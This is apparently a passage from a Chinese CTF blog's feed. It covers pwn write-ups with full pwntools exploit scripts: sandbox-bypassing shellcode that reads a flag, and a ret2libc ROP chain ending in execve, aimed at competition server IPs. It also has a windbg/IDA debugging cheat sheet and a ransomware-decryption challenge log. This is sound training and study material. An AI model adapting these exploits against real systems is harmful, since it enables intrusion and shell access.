number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'8.147.128.163'</span><span class="token punctuation">,</span> <span class="token number">36703</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'\x00PP'</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''/* openat(fd=-0x64, file='flag', oflag=0) */        add rax, 0x62        mov r12, rax        mov rsi, rax        mov rdi, -0x64        /* call openat() */        mov rax, 0x101 /* 0x101 */        syscall        /* preadv2(vararg_0=3, vararg_1=0x1337090, vararg_2=1, vararg_3=0, vararg_4=0) */        mov rdi, 3        mov rdx, 0x1        add r12, 0x15        mov rsi, r12        /* call preadv2() */        mov rax, 327        syscall        /* writev(fd=1, iovec=0x1337090, count=1) */        mov rdi, 1        mov rdx, 0x1        /* call writev() */        mov rax, 0x14        syscall'''</span><span class="token punctuation">)</span>p <span class="token operator">+=</span> shellcode <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'flag\x00'</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1337090</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'entrance'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h3><p>先检查保护</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Arch:     amd64-64-little   RELRO:    Partial RELRO   Stack:    No canary found   NX:       NX enabled   PIE:      No PIE (0x3ff000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>main</code>函数里存在栈溢出，溢出长度刚好是一个地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-50h] BYREF</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"where is my stdout???"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点是<code>init</code>函数，输出被设置为全缓冲区，只有当缓冲区被填满时才会进行I&#x2F;O操作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以通过以下方式进行手动刷新缓冲区从而输出缓冲区中的内容：</p><ul><li>显式调用<code>fflush</code>函数</li><li>流被关闭（调用<code>fclose</code>）</li><li>程序正常结束（调用<code>exit</code>）</li></ul><p>程序其他部分包括<code>vuln extend</code>，<code>vuln</code>目的是进行更大长度的栈溢出，而<code>extend</code>是为了向输出缓冲区填入更多内容加快填满输出缓冲区，因为直接通过输出一个地址来填满输出缓冲区会由于连接不稳定而无法打通远程</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-4h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Just to increase the number of got tables"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token char">'!olleh'</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"hello!"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"hello!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以本题的思路就是先利用<code>extend</code>填满输出缓冲区，再<code>ret2libc</code>，<code>exp</code>如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.106.48.123'</span><span class="token punctuation">,</span> <span class="token number">31448</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>vuln <span class="token operator">=</span> <span class="token number">0x40125D</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x58</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d3</span>pop_rsi_r12_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d1</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>extend <span class="token operator">=</span> <span class="token number">0x401287</span>p1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>extend<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">54</span> <span class="token operator">+</span> p1 <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x84420</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000142c92</span> <span class="token operator">+</span> libc_baseexecve <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'execve'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r12_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>execve<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;比赛打一半去学逆向啦， &lt;code&gt;awdp&lt;/code&gt;的&lt;code&gt;pwn&lt;/code&gt;没打&lt;/p&gt;
&lt;h3 id=&quot;初探勒索病毒&quot;&gt;&lt;a href=&quot;#初探勒索病毒&quot; class=&quot;headerlink&quot; title=&quot;初探勒索病毒&quot;&gt;&lt;/a&gt;初探勒索病毒&lt;/h3&gt;&lt;</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="shellcode" scheme="https://starrysky1004.github.io/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>windbg+IDA逆向分析基础用法</title>
    <link href="https://starrysky1004.github.io/2024/07/11/windbg-ida-ni-xiang-fen-xi-ji-chu-yong-fa/windbg-ida-ni-xiang-fen-xi-ji-chu-yong-fa/"/>
    <id>https://starrysky1004.github.io/2024/07/11/windbg-ida-ni-xiang-fen-xi-ji-chu-yong-fa/windbg-ida-ni-xiang-fen-xi-ji-chu-yong-fa/</id>
    <published>2024-07-11T15:50:14.000Z</published>
    <updated>2024-07-29T08:34:19.886Z</updated>
    
    <content type="html"><![CDATA[<h2 id="windbg基础用法"><a href="#windbg基础用法" class="headerlink" title="windbg基础用法"></a>windbg基础用法</h2><h3 id="运行前"><a href="#运行前" class="headerlink" title="运行前"></a>运行前</h3><p>打开文件：<code>文件 -&gt; Launch executable</code></p><p>查看反编译汇编：<code>View -&gt; Layouts -&gt; Disassembly</code></p><p>设置符号路径：<code>.sympath srv*</code></p><p>加载符号：<code>.reload</code></p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>运行：<code>g</code></p><p>单步执行不进入函数：<code>p</code></p><p>单步执行进入函数：<code>t</code></p><h3 id="查看-x2F-修改状态"><a href="#查看-x2F-修改状态" class="headerlink" title="查看&#x2F;修改状态"></a>查看&#x2F;修改状态</h3><p>查看堆栈状态：<code>kb</code></p><p>查看寄存器：<code>r</code> &#x2F; <code>r register</code></p><p>修改寄存器：<code>r register = value</code></p><h3 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h3><p>查看指定地址反编译代码：<code>u addr</code></p><p>以双字的形式查看内存：</p><p><code>dd addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; dd 0040000000400000  00405000 00406000 00407000 0040800000400010  00409000 0040A000 0040B000 0040C000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>dc addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; dc 0040000000400000  00405000 00406000 00407000 00408000  .P...&#96;...p...&#96;...00400010  00409000 0040A000 0040B000 0040C000  ..&#96;...&#96;...&#96;...&#96;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以<code>Unicode</code>字符串的形式查看内存：<code>du addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; du 0040000000400000  &quot;Hello, world!&quot;00400010  &quot;This is a test string.&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以字节的形式查看内存：<code>db addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; db 0040000000400000  48 65 6C 6C 6F 2C 20 77-6F 72 6C 64 21 00 00 00  Hello, world!...00400010  54 68 69 73 20 69 73 20-61 20 74 65 73 74 20 73  This is a test s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以ASCII字符的形式查看内存：<code>da addr / register</code></p><p>以字的形式查看内存：<code>dw addr / register</code></p><p>以十六进制双字的形式查看内存：<code>dD addr / register</code></p><p>以内存内容的指针的形式查看内存：<code>dp addr / register</code></p><h3 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h3><p>查看断点详细情况：<code>bl</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; bl     0 e Disable Clear  00000000 e 1 0001 (0001)  0:****      1 e Disable Clear  00300003     0001 (0001)  0:**** GOM32Q_vc120_ReleaseQC+0x3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查看断点：<code>.bpcmds</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; .bpcmdsba0 e1 0x00000000 ;bp1 0x00300003 ;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>下断点：</p><p><code>bp</code> ：设置断点，在指定断点位置设置新的断点，如果调试器无法解析断点位置的地址表达式，则自动转换为bu断点，使用bp命令创建在卸载模块时不再处于活动状态的断点</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> bp MyTest+0xb <span class="token number">7</span> <span class="token comment">#前六次忽略此断点，第七次传递时，执行会停止</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>bm</code>：设置符号断点，命令在与指定模式匹配的符号上设置新的断点。 此命令可以创建多个断点。 默认情况下，匹配模式后，bm断点与bu断点相同。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> bm myprogram<span class="token operator">!</span>mem*   <span class="token number">4</span>: 0040d070 MyProgram<span class="token operator">!</span>memcpy  <span class="token number">5</span>: 0040c560 MyProgram<span class="token operator">!</span>memmove  <span class="token number">6</span>: 00408960 MyProgram<span class="token operator">!</span>memset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>bu</code>：设置未解析断点，命令设置延迟或未解析的断点。bu断点是在对命令中指定的断点位置的符号引用上设置的， (不在地址) 上，每当解析具有引用的模块时，就会激活该断点。 </p><p><code>bc</code>:从系统中永久删除先前设置的断点</p><p><code>bc id</code>删除指定<code>id</code>号的断点</p><h2 id="windbg结合IDA逆向分析"><a href="#windbg结合IDA逆向分析" class="headerlink" title="windbg结合IDA逆向分析"></a>windbg结合IDA逆向分析</h2><h3 id="通过IDA中的地址下断点"><a href="#通过IDA中的地址下断点" class="headerlink" title="通过IDA中的地址下断点"></a>通过IDA中的地址下断点</h3><p>地址偏移 &#x3D; <code>IDA中的地址 - IDA中的基址</code></p><p>查看模块名称&#x2F;地址：<code>lm</code> （基址为<code>start</code>一列</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> lmstart    end        module name00300000 010f9000   GOM32Q_vc120_ReleaseQC   <span class="token punctuation">(</span>no symbols<span class="token punctuation">)</span>           05990000 05a4c000   swscale_gp_5   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>             05a50000 05d69000   avutil_gp_56   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>             05d70000 07366000   avcodec_gp_58   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取<code>windbg</code>中的地址：<code>模块基址 + 地址偏移</code></p><p>下断点：<code>bu 模块名称 + 地址偏移</code> &#x2F; <code>bu windbg中的地址</code></p><p>例如：<code>IDA</code>中的基址为<code>0x400000</code>，要在<code>IDA</code>中地址为<code>0x500000</code>的位置下断点，则地址偏移为<code>0x500000 - 0x400000 = 0x100000</code>，假设<code>lm</code>查看模块名为<code>test</code>，该模块基址为<code>0x200000</code>，则在<code>windbg</code>中的地址就是<code>0x300000</code>，那么下断点就是<code>du test + 0x100000</code> &#x2F; <code>du 0x300000</code></p><h3 id="通过栈回溯找到IDA中对应函数"><a href="#通过栈回溯找到IDA中对应函数" class="headerlink" title="通过栈回溯找到IDA中对应函数"></a>通过栈回溯找到IDA中对应函数</h3><p>栈回溯查看堆栈情况：<code>kb</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> kb <span class="token comment"># ChildEBP RetAddr      Args to Child              </span>WARNING: Stack unwind information not available. Following frames may be wrong.00 014fedc0 009371cc     00000000 00000000 00000000 GOM32Q_vc120_ReleaseQC+0x6371de01 014fede4 00506a63     014feeec 00000104 0f4aeea8 GOM32Q_vc120_ReleaseQC+0x6371cc02 014ff138 004ed040     0f4cf948 00000001 0080723a GOM32Q_vc120_ReleaseQC+0x206a6303 014ff1fc 008082e2     00a9b640 0f4cf948 00010004 GOM32Q_vc120_ReleaseQC+0x1ed04004 014ff21c 0080392f     0000c391 0f4cf948 00010004 GOM32Q_vc120_ReleaseQC+0x5082e205 014ff28c 008040ea     0f4cd4c0 00010a66 0000c391 GOM32Q_vc120_ReleaseQC+0x50392f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到形如<code>模块名+地址偏移</code>的栈回溯，要找到在<code>IDA</code>中的对应基址只需要用模块名加上的这个地址偏移（即加号后面部分）再加上<code>IDA</code>基址即可</p><p>例如：<code>GOM32Q_vc120_ReleaseQC+0x6371de</code>，则地址偏移为<code>0x6371de</code>，IDA基址为<code>0x400000</code>，那么在<code>IDA</code>中的地址就是<code>0x6371de + 0x400000 = 0xA371DE</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;windbg基础用法&quot;&gt;&lt;a href=&quot;#windbg基础用法&quot; class=&quot;headerlink&quot; title=&quot;windbg基础用法&quot;&gt;&lt;/a&gt;windbg基础用法&lt;/h2&gt;&lt;h3 id=&quot;运行前&quot;&gt;&lt;a href=&quot;#运行前&quot; class=&quot;header</summary>
      
    
    
    
    <category term="逆向" scheme="https://starrysky1004.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="reverse" scheme="https://starrysky1004.github.io/tags/reverse/"/>
    
    <category term="windbg" scheme="https://starrysky1004.github.io/tags/windbg/"/>
    
  </entry>
  
  <entry>
    <title>2024暑期学习记录</title>
    <link href="https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/"/>
    <id>https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/</id>
    <published>2024-07-05T14:27:58.000Z</published>
    <updated>2024-08-31T17:29:38.017Z</updated>
    
    <content type="html"><![CDATA[<h2 id="7-5"><a href="#7-5" class="headerlink" title="#7.5"></a>#7.5</h2><p>早上和晚上在打春秋杯夏季赛，下午被摇过去改论文，春秋杯打完就不打算打比赛啦，留时间把没完成的事完成一下，然后跟着学长一起复现</p><h3 id="初探勒索病毒"><a href="#初探勒索病毒" class="headerlink" title="初探勒索病毒"></a>初探勒索病毒</h3><pre class="line-numbers language-none"><code class="language-none">题目内容：你服务器上的一张图片被Black Basta勒索病毒给加密了。当你在服务器上还原出该图片后，等待一分钟左右，&#x2F;flag就会变为可读权限。（本题下发后会有一个ssh地址、账号密码，选手可通过ssh来访问环境）（关注微信公众号“勒索病毒头条”，发送关键词“BASTA”可获取该题提示。）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我选择直接获取提示</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">【2024春秋杯夏季赛】https://www.nomoreransom.org/zh/decryption-tools.html搜索BlackBasta，并点击下载。（如果您还需要进一步的提示，可在本公众号输入“BASTA2”获取。）【2024春秋杯夏季赛】<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/flags/"flags"/'</span> ./decryptblocks.py<span class="token builtin class-name">export</span> <span class="token assign-left variable">SRL_IGNORE_MAGIC</span><span class="token operator">=</span><span class="token number">1</span>./decryptblocks.py ./banana.jpg.sah28vut5 ./key.block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题的判断依据是能不能正常访问<code>banana.jpg</code>这个图片，所以把<code>banana.jpg.sah28vut5</code>改成<code>banana.jpg</code>再用上面给的指令解密，图片在<code>/var/www/html</code>目录下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> ./banana.jpg.sah28vut5 ./banana.jpg<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/flags/"flags"/'</span> ./decryptblocks.py<span class="token builtin class-name">export</span> <span class="token assign-left variable">SRL_IGNORE_MAGIC</span><span class="token operator">=</span><span class="token number">1</span>./decryptblocks.py ./banana.jpg ./key.block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Shuffled-Execution"><a href="#Shuffled-Execution" class="headerlink" title="Shuffled_Execution"></a>Shuffled_Execution</h3><pre class="line-numbers language-none"><code class="language-none">题目内容：The Fishmonger found a secured entrance to somewhere...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>一道写<code>shellcode</code>的题，创建了一段可读可写可执行区域，写入<code>0x250</code>的数据后开了沙箱并对输入内容进行随机化操作，但是操作长度的判断是通过<code>strlen</code>获取的，所以直接输入<code>\x00</code>即可绕过</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token 